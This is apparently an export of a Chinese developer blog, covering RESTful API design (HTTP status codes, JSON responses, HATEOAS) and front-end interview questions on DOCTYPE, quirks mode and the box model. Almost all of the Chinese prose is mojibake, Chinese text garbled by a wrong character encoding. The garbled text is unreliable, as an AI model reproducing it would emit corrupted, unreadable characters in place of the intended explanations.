å°±æ˜¯ä¸€ä¸ªä¸‰ä½æ•°ï¼Œåˆ†æˆäº”ä¸ªç±»åˆ«ã€‚ 1xxï¼šç›¸å…³ä¿¡æ¯ 2xxï¼šæ“ä½œæˆåŠŸ 3xxï¼šé‡å®šå‘ 4xxï¼šå®¢æˆ·ç«¯é”™è¯¯ 5xxï¼šæœåŠ¡å™¨é”™è¯¯ 2xx çŠ¶æ€ç  200çŠ¶æ€ç è¡¨ç¤ºæ“ä½œæˆåŠŸï¼Œä½†æ˜¯ä¸åŒçš„æ–¹æ³•å¯ä»¥è¿”å›žæ›´ç²¾ç¡®çš„çŠ¶æ€ç ã€‚ GET: 200 OK POST: 201 Created PUT: 200 OK PATCH: 200 OK DELETE: 204 No Content ä¸Šé¢ä»£ç ä¸­ï¼ŒPOSTè¿”å›ž201çŠ¶æ€ç ï¼Œè¡¨ç¤ºç”Ÿæˆäº†æ–°çš„èµ„æºï¼›DELETEè¿”å›ž204çŠ¶æ€ç ï¼Œè¡¨ç¤ºèµ„æºå·²ç»ä¸å­˜åœ¨ã€‚ æ­¤å¤–ï¼Œ202 AcceptedçŠ¶æ€ç è¡¨ç¤ºæœåŠ¡å™¨å·²ç»æ”¶åˆ°è¯·æ±‚ï¼Œä½†è¿˜æœªè¿›è¡Œå¤„ç†ï¼Œä¼šåœ¨æœªæ¥å†å¤„ç†ï¼Œé€šå¸¸ç”¨äºŽå¼‚æ­¥æ“ä½œã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚ 12345678HTTP/1.1 202 Accepted&#123; "task": &#123; "href": "/api/company/job-management/jobs/2130040", "id": "2130040" &#125;&#125; 3xx çŠ¶æ€ç  API ç”¨ä¸åˆ°301çŠ¶æ€ç ï¼ˆæ°¸ä¹…é‡å®šå‘ï¼‰å’Œ302çŠ¶æ€ç ï¼ˆæš‚æ—¶é‡å®šå‘ï¼Œ307ä¹Ÿæ˜¯è¿™ä¸ªå«ä¹‰ï¼‰ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥ç”±åº”ç”¨çº§åˆ«è¿”å›žï¼Œæµè§ˆå™¨ä¼šç›´æŽ¥è·³è½¬ï¼ŒAPI çº§åˆ«å¯ä»¥ä¸è€ƒè™‘è¿™ä¸¤ç§æƒ…å†µã€‚ API ç”¨åˆ°çš„3xxçŠ¶æ€ç ï¼Œä¸»è¦æ˜¯303 See Otherï¼Œè¡¨ç¤ºå‚è€ƒå¦ä¸€ä¸ª URLã€‚å®ƒä¸Ž302å’Œ307çš„å«ä¹‰ä¸€æ ·ï¼Œä¹Ÿæ˜¯â€æš‚æ—¶é‡å®šå‘â€ï¼ŒåŒºåˆ«åœ¨äºŽ302å’Œ307ç”¨äºŽGETè¯·æ±‚ï¼Œè€Œ303ç”¨äºŽPOSTã€PUTå’ŒDELETEè¯·æ±‚ã€‚æ”¶åˆ°303ä»¥åŽï¼Œæµè§ˆå™¨ä¸ä¼šè‡ªåŠ¨è·³è½¬ï¼Œè€Œä¼šè®©ç”¨æˆ·è‡ªå·±å†³å®šä¸‹ä¸€æ­¥æ€Žä¹ˆåŠžã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚ 12HTTP/1.1 303 See OtherLocation: /api/orders/12345 4xx çŠ¶æ€ç  4xxçŠ¶æ€ç è¡¨ç¤ºå®¢æˆ·ç«¯é”™è¯¯ï¼Œä¸»è¦æœ‰ä¸‹é¢å‡ ç§ã€‚ 400 Bad Requestï¼šæœåŠ¡å™¨ä¸ç†è§£å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œæœªåšä»»ä½•å¤„ç†ã€‚ 401 Unauthorizedï¼šç”¨æˆ·æœªæä¾›èº«ä»½éªŒè¯å‡­æ®ï¼Œæˆ–è€…æ²¡æœ‰é€šè¿‡èº«ä»½éªŒè¯ã€‚ 403 Forbiddenï¼šç”¨æˆ·é€šè¿‡äº†èº«ä»½éªŒè¯ï¼Œä½†æ˜¯ä¸å…·æœ‰è®¿é—®èµ„æºæ‰€éœ€çš„æƒé™ã€‚ 404 Not Foundï¼šæ‰€è¯·æ±‚çš„èµ„æºä¸å­˜åœ¨ï¼Œæˆ–ä¸å¯ç”¨ã€‚ 405 Method Not Allowedï¼šç”¨æˆ·å·²ç»é€šè¿‡èº«ä»½éªŒè¯ï¼Œä½†æ˜¯æ‰€ç”¨çš„ HTTP æ–¹æ³•ä¸åœ¨ä»–çš„æƒé™ä¹‹å†…ã€‚ 410 Goneï¼šæ‰€è¯·æ±‚çš„èµ„æºå·²ä»Žè¿™ä¸ªåœ°å€è½¬ç§»ï¼Œä¸å†å¯ç”¨ã€‚ 415 Unsupported Media Typeï¼šå®¢æˆ·ç«¯è¦æ±‚çš„è¿”å›žæ ¼å¼ä¸æ”¯æŒã€‚æ¯”å¦‚ï¼ŒAPI åªèƒ½è¿”å›ž JSON æ ¼å¼ï¼Œä½†æ˜¯å®¢æˆ·ç«¯è¦æ±‚è¿”å›ž XML æ ¼å¼ã€‚ 422 Unprocessable Entity ï¼šå®¢æˆ·ç«¯ä¸Šä¼ çš„é™„ä»¶æ— æ³•å¤„ç†ï¼Œå¯¼è‡´è¯·æ±‚å¤±è´¥ã€‚ 429 Too Many Requestsï¼šå®¢æˆ·ç«¯çš„è¯·æ±‚æ¬¡æ•°è¶…è¿‡é™é¢ã€‚ 5xx çŠ¶æ€ç  5xxçŠ¶æ€ç è¡¨ç¤ºæœåŠ¡ç«¯é”™è¯¯ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒAPI ä¸ä¼šå‘ç”¨æˆ·é€éœ²æœåŠ¡å™¨çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ‰€ä»¥åªè¦ä¸¤ä¸ªçŠ¶æ€ç å°±å¤Ÿäº†ã€‚ 500 Internal Server Errorï¼šå®¢æˆ·ç«¯è¯·æ±‚æœ‰æ•ˆï¼ŒæœåŠ¡å™¨å¤„ç†æ—¶å‘ç”Ÿäº†æ„å¤–ã€‚ 503 Service Unavailableï¼šæœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚ï¼Œä¸€èˆ¬ç”¨äºŽç½‘ç«™ç»´æŠ¤çŠ¶æ€ã€‚ æœåŠ¡å™¨å›žåº”ä¸è¦è¿”å›žçº¯æœ¬æ–‡ API è¿”å›žçš„æ•°æ®æ ¼å¼ï¼Œä¸åº”è¯¥æ˜¯çº¯æ–‡æœ¬ï¼Œè€Œåº”è¯¥æ˜¯ä¸€ä¸ª JSON å¯¹è±¡ï¼Œå› ä¸ºè¿™æ ·æ‰èƒ½è¿”å›žæ ‡å‡†çš„ç»“æž„åŒ–æ•°æ®ã€‚æ‰€ä»¥ï¼ŒæœåŠ¡å™¨å›žåº”çš„ HTTP å¤´çš„Content-Typeå±žæ€§è¦è®¾ä¸ºapplication/jsonã€‚ å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼Œä¹Ÿè¦æ˜Žç¡®å‘Šè¯‰æœåŠ¡å™¨ï¼Œå¯ä»¥æŽ¥å— JSON æ ¼å¼ï¼Œå³è¯·æ±‚çš„ HTTP å¤´çš„ACCEPTå±žæ€§ä¹Ÿè¦è®¾æˆapplication/jsonã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚ 12GET /orders/2 HTTP/1.1Accept: application/json å‘ç”Ÿé”™è¯¯æ—¶ï¼Œä¸è¦è¿”å›ž 200 çŠ¶æ€ç  æœ‰ä¸€ç§ä¸æ°å½“çš„åšæ³•æ˜¯ï¼Œå³ä½¿å‘ç”Ÿé”™è¯¯ï¼Œä¹Ÿè¿”å›ž200çŠ¶æ€ç ï¼ŒæŠŠé”™è¯¯ä¿¡æ¯æ”¾åœ¨æ•°æ®ä½“é‡Œé¢ï¼Œå°±åƒä¸‹é¢è¿™æ ·ã€‚ 123456789HTTP/1.1 200 OKContent-Type: application/json&#123; "status": "failure", "data": &#123; "error": "Expected at least two items in list." &#125;&#125; ä¸Šé¢ä»£ç ä¸­ï¼Œè§£æžæ•°æ®ä½“ä»¥åŽï¼Œæ‰èƒ½å¾—çŸ¥æ“ä½œå¤±è´¥ã€‚ è¿™å¼ åšæ³•å®žé™…ä¸Šå–æ¶ˆäº†çŠ¶æ€ç ï¼Œè¿™æ˜¯å®Œå…¨ä¸å¯å–çš„ã€‚æ­£ç¡®çš„åšæ³•æ˜¯ï¼ŒçŠ¶æ€ç åæ˜ å‘ç”Ÿçš„é”™è¯¯ï¼Œå…·ä½“çš„é”™è¯¯ä¿¡æ¯æ”¾åœ¨æ•°æ®ä½“é‡Œé¢è¿”å›žã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚ 123456789HTTP/1.1 400 Bad RequestContent-Type: application/json&#123; "error": "Invalid payoad.", "detail": &#123; "surname": "This field is required." &#125;&#125; æä¾›é“¾æŽ¥ API çš„ä½¿ç”¨è€…æœªå¿…çŸ¥é“ï¼ŒURL æ˜¯æ€Žä¹ˆè®¾è®¡çš„ã€‚ä¸€ä¸ªè§£å†³æ–¹æ³•å°±æ˜¯ï¼Œåœ¨å›žåº”ä¸­ï¼Œç»™å‡ºç›¸å…³é“¾æŽ¥ï¼Œä¾¿äºŽä¸‹ä¸€æ­¥æ“ä½œã€‚è¿™æ ·çš„è¯ï¼Œç”¨æˆ·åªè¦è®°ä½ä¸€ä¸ª URLï¼Œå°±å¯ä»¥å‘çŽ°å…¶ä»–çš„ URLã€‚è¿™ç§æ–¹æ³•å«åš HATEOASã€‚ ä¸¾ä¾‹æ¥è¯´ï¼ŒGitHub çš„ API éƒ½åœ¨ api.github.com è¿™ä¸ªåŸŸåã€‚è®¿é—®å®ƒï¼Œå°±å¯ä»¥å¾—åˆ°å…¶ä»– URLã€‚ 123456789&#123; ... "feeds_url": "https://api.github.com/feeds", "followers_url": "https://api.github.com/user/followers", "following_url": "https://api.github.com/user/following&#123;/target&#125;", "gists_url": "https://api.github.com/gists&#123;/gist_id&#125;", "hub_url": "https://api.github.com/hub", ...&#125; ä¸Šé¢çš„å›žåº”ä¸­ï¼ŒæŒ‘ä¸€ä¸ª URL è®¿é—®ï¼Œåˆå¯ä»¥å¾—åˆ°åˆ«çš„ URLã€‚å¯¹äºŽç”¨æˆ·æ¥è¯´ï¼Œä¸éœ€è¦è®°ä½ URL è®¾è®¡ï¼Œåªè¦ä»Ž api.github.com ä¸€æ­¥æ­¥æŸ¥æ‰¾å°±å¯ä»¥äº†ã€‚ HATEOAS çš„æ ¼å¼æ²¡æœ‰ç»Ÿä¸€è§„å®šï¼Œä¸Šé¢ä¾‹å­ä¸­ï¼ŒGitHub å°†å®ƒä»¬ä¸Žå…¶ä»–å±žæ€§æ”¾åœ¨ä¸€èµ·ã€‚æ›´å¥½çš„åšæ³•åº”è¯¥æ˜¯ï¼Œå°†ç›¸å…³é“¾æŽ¥ä¸Žå…¶ä»–å±žæ€§åˆ†å¼€ã€‚ 12345678910HTTP/1.1 200 OKContent-Type: application/json&#123; "status": "In progress", "links": &#123;[ &#123; "rel":"cancel", "method": "delete", "href":"/api/status/12345" &#125; , &#123; "rel":"edit", "method": "put", "href":"/api/status/12345" &#125; ]&#125;&#125; æƒ³äº†è§£æ›´å¤šè¯¦æƒ…çš„ï¼Œå¯ä»¥ç‚¹å‡» RESETful API è®¾è®¡è§„èŒƒ æˆ‘æ‰€ç†è§£çš„RESTful Web API [Webæ ‡å‡†ç¯‡] æˆ‘æ‰€ç†è§£çš„RESTful Web API [è®¾è®¡ç¯‡] å‚è€ƒé“¾æŽ¥ ç†è§£RESTfulæž¶æž„-é˜®ä¸€å³° RESTful API æœ€ä½³å®žè·µ]]></content>
      <categories>
        <category>RESTful</category>
      </categories>
      <tags>
        <tag>RESTful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯é¢è¯•é¢˜ç›®æ±‡æ€»æ‘˜å½•ï¼ˆHTML å’Œ CSSç¯‡ï¼‰]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-HTML%20%E5%92%8C%20CSS%E7%AF%87.html</url>
    <content type="text"><![CDATA[æ¸©æ•…è€ŒçŸ¥æ–°ï¼Œä¿æŒç©ºæ¯å¿ƒæ€ HTML å’Œ CSSä½ åšçš„é¡µé¢åœ¨å“ªäº›æµè§ˆå™¨æµ‹è¯•è¿‡ï¼Ÿè¿™äº›æµè§ˆå™¨çš„å†…æ ¸åˆ†åˆ«æ˜¯ä»€ä¹ˆ æµè§ˆå™¨åç§° å†…æ ¸ IE trident Firefoxï¼ˆç«ç‹ï¼‰ gecko Safari webkit Opera ä»¥å‰æ˜¯ presto ï¼ŒçŽ°åœ¨å·²æ”¹ç”¨ Google Chrome çš„ Blink å†…æ ¸ Chromeï¼ˆè°·æ­Œï¼‰ Blinkï¼ˆåŸºäºŽ webkitï¼ŒGoogle ä¸Ž Opera Software å…±åŒå¼€å‘ï¼‰ æ¯ä¸ª HTML æ–‡ä»¶é‡Œå¼€å¤´éƒ½æœ‰ä¸ªé‡è¦çš„ä¸œè¥¿ï¼Œ Doctype,çŸ¥é“è¿™ä¸ªæ˜¯å¹²ä»€ä¹ˆçš„å—ï¼Ÿ&lt;! DOCTYPE&gt; å£°æ˜Žä½äºŽæ–‡æ¡£ä¸­çš„æœ€å‰é¢çš„ä½ç½®ï¼Œå¤„äºŽ &lt;html&gt; æ ‡ç­¾ä¹‹å‰ï¼Œæ­¤æ ‡ç­¾å¯ä»¥å‘ŠçŸ¥æµè§ˆå™¨æ–‡æ¡£ä½¿ç”¨å“ªç§ HTML æˆ– XHTML è§„èŒƒã€‚ï¼ˆé‡ç‚¹ï¼šå‘Šè¯‰æµè§ˆå™¨æŒ‰ç…§å“ªç§è§„èŒƒè§£æžé¡µé¢ï¼‰ Quirks æ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿå®ƒå’Œ Standards æ¨¡å¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿä»Ž IE6 å¼€å§‹ï¼Œå¼•å…¥äº† Standards æ¨¡å¼ï¼Œæ ‡å‡†æ¨¡å¼ä¸­ï¼Œæµè§ˆå™¨å°è¯•ç¬¦åˆæ ‡å‡†çš„æ–‡æ¡£åœ¨è§„èŒƒä¸Šçš„æ­£ç¡®å¤„ç†è¾¾åˆ°åœ¨æŒ‡å®šæµè§ˆå™¨ä¸­çš„ç¨‹åº¦ã€‚ åœ¨IE6 ä¹‹å‰ CSS è¿˜ä¸å¤Ÿæˆç†Ÿï¼Œæ‰€ä»¥ IE5 ç­‰ä¹‹å‰çš„æµè§ˆå™¨å¯¹ CSS çš„æ”¯æŒå¾ˆå·®ï¼ŒIE6 å°†å¯¹ CSS æä¾›æ›´å¥½çš„æ”¯æŒï¼Œç„¶åŽè¿™æ—¶é—®é¢˜å°±æ¥äº†ï¼Œå› ä¸ºæœ‰å¾ˆå¤šé¡µé¢æ˜¯åŸºäºŽæ—§çš„çš„å¸ƒå±€æ–¹å¼å†™çš„ï¼Œå¦‚æžœ IE6 æ”¯æŒ CSS åˆ™å°†è¿™äº›é¡µé¢æ˜¾ç¤ºä¸æ­£å¸¸ï¼Œå¦‚ä½•åœ¨å³ä¿è¯ä¸ç ´åçŽ°æœ‰é¡µé¢ï¼Œåˆæä¾›æ–°çš„æ¸²æŸ“æœºåˆ¶ï¼Ÿ åœ¨å†™ç¨‹åºæ—¶æˆ‘ä»¬ä¹Ÿä¼šç»å¸¸é‡åˆ°è¿™æ ·çš„é—®é¢˜ï¼Œå¦‚ä½•ä¿è¯åŽŸæ¥çš„æŽ¥å£ä¸å˜ï¼Œæä¾›æ›´å¼ºå¤§çš„åŠŸèƒ½ï¼Œå°¤å…¶æ˜¯æ–°åŠŸèƒ½ä¸å…¼å®¹æ—§åŠŸèƒ½çš„æ—¶å€™ã€‚é‡åˆ°è¿™ç§é—®é¢˜æ—¶çš„ä¸€ä¸ªå¸¸è§çš„åšæ³•å°±æ˜¯å¢žåŠ å‚æ•°å’Œåˆ†æ”¯ï¼Œå³å½“æŸä¸ªå‚æ•°ä¸ºçœŸï¼Œæˆ‘ä»¬å°±ä½¿ç”¨æ–°çš„åŠŸèƒ½ï¼Œå¦‚æžœè¿™ä¸ªå‚æ•°ä¸ä¸ºçœŸçš„æ—¶å€™ï¼Œå°±ä½¿ç”¨æ—§çš„åŠŸèƒ½ï¼Œè¿™æ ·å°±å¯ä»¥ä¸ç ´ååŽŸæ¥çš„ç¨‹åºï¼Œåˆèƒ½æä¾›æ–°çš„åŠŸèƒ½ã€‚IE6 ä¹Ÿæ˜¯ç±»ä¼¼è¿™æ ·åšï¼Œå®ƒå°† DTD å½“æˆäº† è¿™ä¸ªå‚æ•°ï¼Œå› ä¸ºå½“å‰çš„é¡µé¢å¤§å®¶éƒ½ä¸ä¼šåŽ»å†™ DTD ï¼Œæ‰€ä»¥ IE6 å°±å‡å®šå¦‚æžœå†™äº† DTD å°±æ„å‘³ç€è¿™ä¸ªé¡µé¢å°†é‡‡ç”¨å¯¹ CSS æ”¯æŒæ›´å¥½çš„å¸ƒå±€ï¼Œè€Œå¦‚æžœæ²¡æœ‰ï¼Œå°±é‡‡ç”¨å…¼å®¹ä¹‹å‰çš„å¸ƒå±€æ–¹å¼ï¼Œè¿™å°±æ˜¯ Quirks æ¨¡å¼ï¼ˆæ€ªç™–æ¨¡å¼ï¼Œè¯¡å¼‚æ¨¡å¼ï¼Œæ€ªå¼‚æ¨¡å¼ï¼‰ å®žä¾‹ï¼š 123&lt;!DOCTYPE html&gt;&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd" &gt;&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt; ç¬¬ä¸€ç§ï¼šè¡¨æ˜Žè¯¥é¡µé¢æ˜¯éµå®ˆäº† HTML5 è§„èŒƒçš„ï¼Œæµè§ˆå™¨ä¼šé€‰æ‹© Standards Mode ï¼Œè¿™ç§ doctype æ˜¯æœ€æŽ¨èçš„ä¸€ç§ã€‚ ç¬¬äºŒç§ï¼šæµè§ˆå™¨åŒæ ·ä¼šé€‰æ‹© Standards Mode ,è™½ç„¶ç¬¬ä¸€ç§ doctype æœ‰ä¸€äº›åŒºåˆ«ï¼Œä½†å‡ ä¹Žå¯ä»¥è®¤ä¸ºæ˜¯ä¸€æ ·çš„ ç¬¬ä¸‰ç§ï¼šæµè§ˆå™¨ä¼šé€‰æ‹© Almost Standards Mode ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¹³æ²Ÿä»ŠåŽéœ€è¦æŠŠè¿™ä¸ªé¡µé¢é‡æ–°æ”¹å†™æˆ HTML5 è§„èŒƒï¼Œé‚£ä¹ˆ table æ ‡ç­¾ä¸­çš„åˆ†å‰²å›¾ç‰‡é—®é¢˜å¯èƒ½ä¼šè¢«é”™ä¹±ã€‚ å½“ doctype ç¼ºå¤±ï¼ˆä¸æ³¨æ˜Žã€å†™é”™ï¼‰æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šé€‰æ‹© Quirks Mode,è¿™æ˜¯éžå¸¸ä¸æŽ¨èçš„æ–¹å¼ï¼Œæˆ‘ä»¬åº”è¯¥å°½é‡é¿å… Quirks Mode åŒºåˆ«ï¼š æ€»ä½“ä¼šæœ‰å¸ƒå±€ã€æ ·å¼è§£æžå’Œè„šæœ¬æ‰§è¡Œä¸‰ä¸ªæ–¹é¢çš„åŒºåˆ«ã€‚ æ—©æœŸçš„ IE æµè§ˆå™¨ï¼ˆIE 6 ä»¥å‰ï¼‰å°†ç›’å­çš„ padding å’Œ border ç®—åˆ°äº†ç›’å­çš„å°ºå¯¸ä¸­ï¼Œè¿™ä¸€æ¨¡åž‹è¢«ç§°ä¸º IE ç›’æ¨¡åž‹ã€‚åœ¨ IE ç›’æ¨¡åž‹ä¸­ box width = content width + padding left + padding right + border left + border right box width = content width + padding left + padding right + border left + border right è€Œåœ¨ W3C æ ‡å‡†çš„ç›’æ¨¡åž‹ä¸­ï¼Œbox çš„å¤§å°å°±æ˜¯ content çš„å¤§å° box width = content widthï¼Œbox height = content height è¿™ä¸€åŒºåˆ«å°†å¯¼è‡´é¡µé¢ç»˜åˆ¶æ—¶æ‰€æœ‰çš„å—çº§å…ƒç´ éƒ½å‡ºçŽ°å¾ˆå¤§çš„å·®åˆ«ï¼Œæ‰€ä»¥ä¸¤ç§ä¸åŒçš„æ–‡æ¡£æ¨¡å¼ä¸‹çš„é¡µé¢ä¹ŸåŒºåˆ«å¾ˆå¤§ã€‚ è®¾ç½®è¡Œå†…å…ƒç´ çš„é«˜å®½ï¼Œåœ¨ Standards æ¨¡å¼ä¸‹ï¼Œç»™ &lt;span&gt; ç­‰è¡Œå†…å…ƒç´ è®¾ç½® width å’Œ height éƒ½ä¸ä¼šç”Ÿæ•ˆï¼Œè€Œåœ¨ quirks æ¨¡å¼ä¸‹ï¼Œä¼šç”Ÿæ•ˆã€‚ è®¾ç½®ç™¾åˆ†æ¯”çš„é«˜åº¦ï¼Œåœ¨ Standards æ¨¡å¼ä¸‹ï¼Œä¸€ä¸ªå…ƒç´ çš„é«˜åº¦æ˜¯ç”±å…¶åŒ…å«çš„å†…å®¹æ¥å†³å®šçš„ï¼Œå¦‚æžœçˆ¶å…ƒç´ æ²¡æœ‰è®¾ç½®ç™¾åˆ†æ¯”çš„é«˜åº¦ï¼Œå­å…ƒç´ è®¾ç½®äº†ä¸€ä¸ªç™¾åˆ†æ¯”çš„é«˜åº¦æ˜¯æ— æ•ˆç”¨çš„ã€‚ margin:0 auto è®¾ç½®æ°´å¹³å±…ä¸­ï¼Œä½¿ç”¨ margin:0 auto åœ¨ standards æ¨¡å¼ä¸‹å¯ä»¥ä½¿å…ƒç´ æ°´å¹³ å±…ä¸­ï¼Œä½†åœ¨ quirks æ¨¡å¼ä¸‹å´ä¼šå¤±æ•ˆã€‚ åœ¨Quirks Modeä¸‹ï¼Œä¸ºbodyè®¾ç½®ä¸€ä¸ªmarginæ˜¯æ— æ•ˆçš„ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒIEæœ‰ä¸€ä¸ªåž‚ç›´æ»šåŠ¨æ¡ï¼Œå°½ç®¡å½“æ²¡æœ‰ä¸œè¥¿å¯ä»¥æ»šåŠ¨çš„æ—¶å€™ï¼Œå®ƒæ˜¯éžæ´»åŠ¨çŠ¶ï¼ˆè¿Ÿé’çŠ¶æ€ï¼‰ï¼Œåœ¨Quirks Modeä¸‹ï¼Œä½ å¯ä»¥é€šè¿‡è®¾ç½®body { overflow: auto;}åˆ é™¤å®ƒï¼ˆå½“ä¸éœ€å®ƒçš„æ—¶å€™ï¼‰ï¼Œä½†æ˜¯åœ¨æ ‡å‡†æ¨¡å¼ä¸‹ï¼Œä½ ä»ç„¶éœ€è¦å¢žåŠ html { overflow: auto;} é»˜è®¤çš„æµ®åŠ¨å›¾ç‰‡çš„æ°´å¹³marginæ˜¯3åƒç´ ï¼ˆè€Œä¸æ˜¯0ï¼‰ã€‚ å­—ä½“å±žæ€§ä¸ä¼šä»Žbodyæˆ–å…¶ä»–å°é—­å…ƒç´ ç»§æ‰¿åˆ°tableä¸­ã€‚ç‰¹åˆ«æ˜¯font-sizeã€‚å­—ä½“ï¼Œé¢œè‰²ï¼Œè¡Œé«˜ä¹Ÿéƒ½æœ‰å¯èƒ½ã€‚ ï¼ˆè¿˜æœ‰å¾ˆå¤šï¼Œç­”å‡ºä»€ä¹ˆä¸é‡è¦ï¼Œå…³é”®æ˜¯çœ‹ä»–ç­”å‡ºçš„è¿™äº›æ˜¯ä¸æ˜¯è‡ªå·±ç»éªŒé‡åˆ°çš„ï¼Œè¿˜æ˜¯è¯´éƒ½æ˜¯çœ‹æ–‡ç« çœ‹çš„ï¼Œç”šè‡³å®Œå…¨ä¸çŸ¥é“ã€‚ï¼‰ div+css çš„å¸ƒå±€è¾ƒ table å¸ƒå±€æœ‰ä»€ä¹ˆä¼˜ç‚¹ æ”¹ç‰ˆçš„æ—¶å€™æ›´æ–¹ä¾¿ï¼Œåªè¦æ”¹css æ–‡ä»¶ é¡µé¢åŠ è½½é€Ÿåº¦æ›´å¿«ã€ç»“æž„åŒ–æ¸…æ™°ã€é¡µé¢æ˜¾ç¤ºç®€æ´ è¡¨çŽ°ä¸Žç»“æž„ç›¸åˆ†ç¦» æ˜“äºŽä¼˜åŒ–ï¼ˆseoï¼‰æœç´¢å¼•æ“Žæ›´åŠ å‹å¥½ï¼ŒæŽ’åæ›´å®¹æ˜“é å‰ img çš„ alt ä¸Ž title æœ‰ä½•å¼‚åŒï¼Ÿstrong ä¸Ž em çš„å¼‚åŒalt ï¼ˆalt textï¼‰ï¼šä¸ºä¸èƒ½æ˜¾ç¤ºå›¾åƒã€çª—ä½“æˆ– applets çš„ç”¨æˆ·ä»£ç†ï¼ˆUAï¼‰ï¼Œaltå±žæ€§ç”¨æ¥æŒ‡å®šæ›¿æ¢æ–‡å­—ã€‚æ›¿æ¢æ–‡å­—çš„è¯­è¨€ç”±lang å±žæ€§æŒ‡å®šã€‚ï¼ˆåœ¨ IE æµè§ˆå™¨ä¸‹ä¼šåœ¨æ²¡æœ‰ title æ—¶æŠŠ alt å½“æˆ tool tip æ˜¾ç¤ºï¼‰ title ï¼ˆtool tipï¼‰: è¯¥å±žæ€§ä¸ºè®¾ç½®è¯¥å±žæ€§çš„å…ƒç´ æä¾›å»ºè®®æ€§çš„æ¶ˆæ¯ strongï¼šç²—ä½“å¼ºè°ƒæ ‡ç­¾ï¼Œå¼ºè°ƒï¼Œè¡¨ç¤ºå†…å®¹çš„é‡è¦æ€§ emï¼šæ–œä½“å¼ºè°ƒæ ‡ç­¾ï¼Œæ›´å¼ºçƒˆå¼ºè°ƒï¼Œè¡¨ç¤ºå†…å®¹çš„å¼ºè°ƒç‚¹ æè¿°ä¸€ä¸‹æ¸è¿›å¢žå¼ºä¸Žä¼˜é›…é™çº§ä¹‹é—´çš„ä¸åŒæ¸è¿›å¢žå¼ºï¼ˆprogressive enhancementï¼‰ï¼šé’ˆå¯¹ä½Žç‰ˆæœ¬æµè§ˆå™¨è¿›è¡Œæž„å»ºé¡µé¢ï¼Œä¿è¯æœ€åŸºæœ¬çš„åŠŸèƒ½ï¼Œç„¶åŽå†é’ˆå¯¹é«˜çº§æµè§ˆå™¨è¿›è¡Œæ•ˆæžœã€äº¤äº’ç­‰æ”¹è¿›å’Œè¿½åŠ åŠŸèƒ½è¾¾åˆ°æ›´å¥½çš„ç”¨æˆ·ä½“éªŒã€‚ ä¼˜é›…é™çº§ ï¼ˆgraceful degradationï¼‰ï¼šä¸€å¼€å§‹å°±æž„å»ºå®Œæ•´çš„åŠŸèƒ½ï¼Œç„¶åŽå†é’ˆå¯¹ä½Žç‰ˆæœ¬æµè§ˆå™¨è¿›è¡Œå…¼å®¹ åŒºåˆ«ï¼šä¼˜é›…é™çº§æ˜¯ä»Žå¤æ‚çš„çŽ°çŠ¶å¼€å§‹ï¼Œå¹¶è¯•å›¾å‡å°‘ç”¨æˆ·ä½“éªŒçš„æ”»å‡»ï¼Œè€Œæ¸è¿›å¢žå¼ºåˆ™æ˜¯ä»Žä¸€ä¸ªéžå¸¸åŸºç¡€çš„ï¼Œèƒ½å¤Ÿå™¨ä½œç”¨çš„ç‰ˆæœ¬å¼€å§‹ï¼Œå¹¶ä¸æ–­æ‰©å……ï¼Œä»¥é€‚åº”æœªæ¥çŽ¯å¢ƒçš„éœ€è¦ã€‚é™çº§ï¼ˆåŠŸèƒ½è¡°å‡ï¼‰æ„å‘³ç€å¾€å›žçœ‹ï¼›è€Œæ¸è¿›å¢žå¼ºåˆ™æ„å‘³ç€æœå‰çœ‹ï¼ŒåŒæ—¶ä¿è¯å…¶æ ¹åŸºå¤„äºŽå®‰å…¨åœ°å¸¦ã€‚ â€œä¼˜é›…é™çº§â€è§‚ç‚¹ â€œä¼˜é›…é™çº§â€è§‚ç‚¹è®¤ä¸ºåº”è¯¥é’ˆå¯¹é‚£äº›æœ€é«˜çº§ã€æœ€å®Œå–„çš„æµè§ˆå™¨æ¥è®¾è®¡ç½‘ç«™ã€‚è€Œå°†é‚£äº›è¢«è®¤ä¸ºâ€œè¿‡æ—¶â€æˆ–æœ‰åŠŸèƒ½ç¼ºå¤±çš„æµè§ˆå™¨ä¸‹çš„æµ‹è¯•å·¥ä½œå®‰æŽ’åœ¨å¼€å‘å‘¨æœŸçš„æœ€åŽé˜¶æ®µï¼Œå¹¶æŠŠæµ‹è¯•å¯¹è±¡é™å®šä¸ºä¸»æµæµè§ˆå™¨å‰çš„ä¸€ä¸ªç‰ˆæœ¬ã€‚ åœ¨è¿™ç§è®¾è®¡èŒƒä¾‹ä¸‹ï¼Œæ—§ç‰ˆçš„æµè§ˆå™¨è¢«è®¤ä¸ºä»…èƒ½æä¾›â€œç®€é™‹å´æ— å¦¨ï¼ˆpoor,but passableï¼‰â€ çš„æµè§ˆä½“éªŒï¼Œå¯ä»¥åšä¸€äº›å°çš„è°ƒæ•´æ¥é€‚åº”æŸä¸ªç‰¹å®šçš„æµè§ˆå™¨ã€‚ä½†ç”±äºŽå®ƒä»¬å¹¶éžæˆ‘ä»¬æ‰€å…³æ³¨çš„ç„¦ç‚¹ï¼Œå› 